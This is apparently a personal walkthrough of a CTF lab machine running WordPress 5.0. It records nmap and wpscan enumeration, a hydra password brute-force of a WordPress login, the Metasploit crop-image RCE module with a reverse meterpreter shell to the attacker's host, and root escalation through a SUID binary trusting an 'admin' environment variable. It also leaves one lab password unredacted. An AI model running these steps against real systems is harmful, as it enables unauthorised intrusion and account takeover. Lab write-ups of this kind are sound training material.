# Enumeration
## ping scan
```sh
⚡ ping ctf.thm
PING ctf.thm (10.10.192.110) 56(84) bytes of data.
64 bytes from ctf.thm (10.10.192.110): icmp_seq=1 ttl=63 time=55.4 ms
64 bytes from ctf.thm (10.10.192.110): icmp_seq=2 ttl=63 time=55.5 ms
64 bytes from ctf.thm (10.10.192.110): icmp_seq=3 ttl=63 time=55.2 ms
^C
--- ctf.thm ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 55.158/55.349/55.513/0.146 ms
```
## nmap scan
```sh
⚡cat nmap_results.txt 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-30 00:06 EET
Nmap scan report for ctf.thm (10.10.192.110)
Host is up (0.055s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 578ada90baed3a470c05a3f7a80a8d78 (RSA)
|   256 c264efabb19a1c87587c4bd50f204626 (ECDSA)
|_  256 5af26292118ead8a9b23822dad53bc16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
|_http-generator: WordPress 5.0
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=12/30%OT=22%CT=1%CU=43346%PV=Y%DS=2%DC=T%G=Y%TM=63AE0F
OS:82%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST
OS:11NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-12-29T22:06:57
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2022-12-29T22:06:57+00:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   55.31 ms 10.11.0.1
2   55.35 ms ctf.thm (10.10.192.110)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.46 seconds
```
**Notes:**
- `ssh` on port 22
- `http` on port 80
- `|_http-server-header: Apache/2.4.29 (Ubuntu)`
- `|_/wp-admin/`
- `|_http-generator: WordPress 5.0`
- `samba` on port 139
- `samba` on port 445
## [[wpscan]] general
```sh
⚡wpscan --url blog.thm 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blog.thm/ [10.10.192.110]
[+] Started: Fri Dec 30 00:13:56 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>

[+] WordPress theme in use: twentytwenty
...

```
**Notes:**
- `/wp-admin/admin-ajax.php` empty
- `/wp-admin/` wp login form
- `http://blog.thm/wp-content/uploads/` directory listing, not an upload form
- `WordPress theme in use: twentytwenty` `Last Updated: 2022-11-02T00:00:00.000Z`
- `WordPress version 5.0`
- username:surname `billy:Joel` `karen:Wheeler` 
## wpscan enumerate users
```sh
⚡wpscan --url blog.thm -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blog.thm/ [10.10.192.110]
[+] Started: Fri Dec 30 01:54:44 2022

Interesting Finding(s):

...
[i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
...
```
**Notes:**
- `kwheel`
- ![[Pasted image 20221230015755.png]]
- `bjoel`
- ![[Pasted image 20221230014331.png]]
## [[smbclient]] scan
```sh
⚡ smbclient -N -L blog.thm -p 139 //blog.thm/BillySMB
Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	BillySMB        Disk      Billy's local SMB Share
	IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
⚡ smbclient -N //blog.thm/BillySMB
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue May 26 21:17:05 2020
  ..                                  D        0  Tue May 26 20:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 21:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 21:13:45 2020
  check-this.png                      N     3082  Tue May 26 21:13:43 2020

		15413192 blocks of size 1024. 9790340 blocks available
smb: \> get Alice-White-Rabbit.jpg 
getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (93.9 KiloBytes/sec) (average 93.9 KiloBytes/sec)
smb: \> get tswift.mp4 
getting file \tswift.mp4 of size 1236733 as tswift.mp4 (415.9 KiloBytes/sec) (average 381.5 KiloBytes/sec)
smb: \> get check-this.png 
getting file \check-this.png of size 3082 as check-this.png (13.5 KiloBytes/sec) (average 357.9 KiloBytes/sec)
smb: \> exit
```
**Notes:**
- Search for image steganography
```sh
⚡ exiftool Alice-White-Rabbit.jpg 
ExifTool Version Number         : 12.50
File Name                       : Alice-White-Rabbit.jpg
Directory                       : .
File Size                       : 33 kB
File Modification Date/Time     : 2022:12:30 00:33:03+02:00
File Access Date/Time           : 2022:12:30 00:43:40+02:00
File Inode Change Date/Time     : 2022:12:30 00:33:03+02:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.02
Resolution Unit                 : None
X Resolution                    : 100
Y Resolution                    : 100
Image Width                     : 400
Image Height                    : 300
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 400x300
Megapixels                      : 0.120
```
![[Pasted image 20221230004754.png]]
- clock at `12:25` might benefit us later?
![[Pasted image 20221230005008.png]]
- QR code to be scanned >> redirects to a youtube video
- The mp4 video is a meme. I don't think that this challenge requires audio decoding but I'll see later
- I've a feeling that we're getting into a rabbit hole here.
# Weaponization
## [[Searchsploit]]
```sh
⚡ searchsploit wordpress 5.0
-------------------------------------------------- ---------------------------------
 Exploit Title                                    |  Path
-------------------------------------------------- ---------------------------------
WordPress 5.0.0 - Image Remote Code Execution     | php/webapps/49512.py
WordPress Core 5.0 - Remote Code Execution        | php/webapps/46511.js
WordPress Core 5.0.0 - Crop-image Shell Upload (M | php/remote/46662.rb
WordPress Core < 5.2.3 - Viewing Unauthenticated/ | multiple/webapps/47690.md
WordPress Core < 5.3.x - 'xmlrpc.php' Denial of S | php/dos/47800.py
WordPress Plugin Custom Pages 0.5.0.1 - Local Fil | php/webapps/17119.txt
WordPress Plugin Database Backup < 5.2 - Remote C | php/remote/47187.rb
WordPress Plugin DZS Videogallery < 8.60 - Multip | php/webapps/39553.txt
WordPress Plugin FeedWordPress 2015.0426 - SQL In | php/webapps/37067.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL I | php/webapps/44943.txt
WordPress Plugin leenk.me 2.5.0 - Cross-Site Requ | php/webapps/39704.txt
WordPress Plugin Marketplace Plugin 1.5.0 < 1.6.1 | php/webapps/18988.php
WordPress Plugin Network Publisher 5.0.1 - 'netwo | php/webapps/37174.txt
WordPress Plugin Nmedia WordPress Member Conversa | php/webapps/37353.php
WordPress Plugin Quick Page/Post Redirect 5.0.3 - | php/webapps/32867.txt
WordPress Plugin RegistrationMagic V 5.0.1.5 - SQ | php/webapps/50686.py
WordPress Plugin Rest Google Maps < 7.11.18 - SQL | php/webapps/48918.sh
WordPress Plugin Smart Slider-3 3.5.0.8 - 'name'  | php/webapps/49958.txt
WordPress Plugin WP-Property 1.35.0 - Arbitrary F | php/webapps/18987.php
-------------------------------------------------- ---------------------------------
Shellcodes: No Results
-------------------------------------------------- ---------------------------------
 Paper Title                                      |  Path
-------------------------------------------------- ---------------------------------
WordPress Core 5.0 - Remote Code Execution        | docs/english/46460-wordpress-5.0
-------------------------------------------------- ---------------------------------
```
```sh
⚡ searchsploit -m 49512.py
⚡ python3 49512.py


__        __            _                           ____   ____ _____
\ \      / /__  _ __ __| |_ __  _ __ ___  ___ ___  |  _ \ / ___| ____|
 \ \ /\ / / _ \| '__/ _` | '_ \| '__/ _ \/ __/ __| | |_) | |   |  _|
  \ V  V / (_) | | | (_| | |_) | | |  __/\__ \__ \ |  _ <| |___| |___
   \_/\_/ \___/|_|  \__,_| .__/|_|  \___||___/___/ |_| \_\____|_____|
                         |_|
                         			5.0.0 and <= 4.9.8

usage :
=======
python3 RCE_wordpress.py http://<IP>:<PORT>/ <Username> <Password> <WordPress_theme>
Traceback (most recent call last):
  File "/home/sami/Documents/THM/CTFs/blog/49512.py", line 31, in <module>
    url = sys.argv[1]
IndexError: list index out of range
```
**Notes:**
- it requires a password
## `bjoel` Account brute-force with [[hydra]]
```sh

hydra -l bjoel -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt blog.thm http-post-form "/wp-login.php:log=^USER6&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username"
...
no results
...
```
## `kwheel` Account brute-force with hydra
```sh
hydra -l kwheel -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 10.10.192.110 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V
[80][http-post-form] host: 10.10.192.110   login: kwheel   password: <REDACTED>
[STATUS] attack finished for 10.10.192.110 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-30 02:24:21
```
**Notes:**
- Obtained creds: `kwheel:<REDACTED>`
![[Pasted image 20221230112615.png]]
- Now that we have creds, we can run the exploits found on exploitdb
- the previous exploit didn't work so I'm trying `WordPress Core 5.0.0 - Crop-image Shell Upl | php/remote/46662.rb` it requires using metasploit framework as it gives license errors if I run it without it.
# Delivery
N/A
# Exploitation
## msfconsole
```sh
msf6 exploit(multi/http/wp_crop_rce) > options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   cutiepie1        yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.85.66      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wik
                                         i/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THEME_DIR                   no        The WordPress theme dir name (disable theme auto-detection if provided)
   USERNAME   kwheel           yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.11.4.14       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress

View the full module info with the info, or info -d command.

msf6 exploit(multi/http/wp_crop_rce) > exploit

[*] Started reverse TCP handler on 10.11.4.14:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39927 bytes) to 10.10.85.66
[*] Meterpreter session 1 opened (10.11.4.14:4444 -> 10.10.85.66:38456) at 2022-12-30 11:39:20 +0200
[*] Attempting to clean up files...

meterpreter >

```
# Post-exploit enum
```sh
meterpreter > cd home
meterpreter > ls
Listing: /home
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040755/rwxr-xr-x  4096  dir   2020-05-26 23:08:48 +0300  bjoel

meterpreter > cd bjoel
meterpreter > ls
Listing: /home/bjoel
====================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
020666/rw-rw-rw-  0      cha   2022-12-30 11:23:30 +0200  .bash_history
100644/rw-r--r--  220    fil   2018-04-04 21:30:26 +0300  .bash_logout
100644/rw-r--r--  3771   fil   2018-04-04 21:30:26 +0300  .bashrc
040700/rwx------  4096   dir   2020-05-25 16:15:58 +0300  .cache
040700/rwx------  4096   dir   2020-05-25 16:15:58 +0300  .gnupg
100644/rw-r--r--  807    fil   2018-04-04 21:30:26 +0300  .profile
100644/rw-r--r--  0      fil   2020-05-25 16:16:22 +0300  .sudo_as_admin_successful
100644/rw-r--r--  69106  fil   2020-05-26 21:33:24 +0300  Billy_Joel_Termination_May20-2020.pdf
100644/rw-r--r--  57     fil   2020-05-26 23:08:47 +0300  user.txt

meterpreter > cat .bash_history
meterpreter > download Billy_Joel_Termination_May20-2020.pdf
[*] Downloading: Billy_Joel_Termination_May20-2020.pdf -> /home/sami/Documents/THM/CTFs/blog/Billy_Joel_Termination_May20-2020.pdf
[*] Downloaded 67.49 KiB of 67.49 KiB (100.0%): Billy_Joel_Termination_May20-2020.pdf -> /home/sami/Documents/THM/CTFs/blog/Billy_Joel_Termination_May20-2020.pdf
[*] download   : Billy_Joel_Termination_May20-2020.pdf -> /home/sami/Documents/THM/CTFs/blog/Billy_Joel_Termination_May20-2020.pdf
```
- Reading the PDF
![[Pasted image 20221230115523.png]]
Looks he's having not so good times...
- user.txt has nothing.
# Privileges Escalation
```sh
find / -perm -u=s -type f 2>/dev/null
/usr/bin/passwd
...
/usr/sbin/checker
...
/snap/core/9066/usr/sbin/pppd
ls -hla /usr/sbin/checker
-rwsr-sr-x 1 root root 8.3K May 26  2020 /usr/sbin/checker
ltrace checker      
getenv("admin")                                  = nil
puts("Not an Admin")                             = 13
Not an Admin
+++ exited (status 0) +++       # it gets the "admin" environment variable and prints out "Not an Admin".
export admin=1                  # setting the environment variable of admin to 1
ltrace checker
getenv("admin")                                  = "1"
setuid(0)                                        = -1
system("/bin/bash"checker       # executed bash as root
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```
# Data ex-filtration (Root flag)
```sh
find / -type f -name user.txt 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt
cat /media/usb/user.txt
<REDACTED>
find / -type f -name root.txt 2>/dev/null
/root/root.txt
cat /root/root.txt
<REDACTED>
```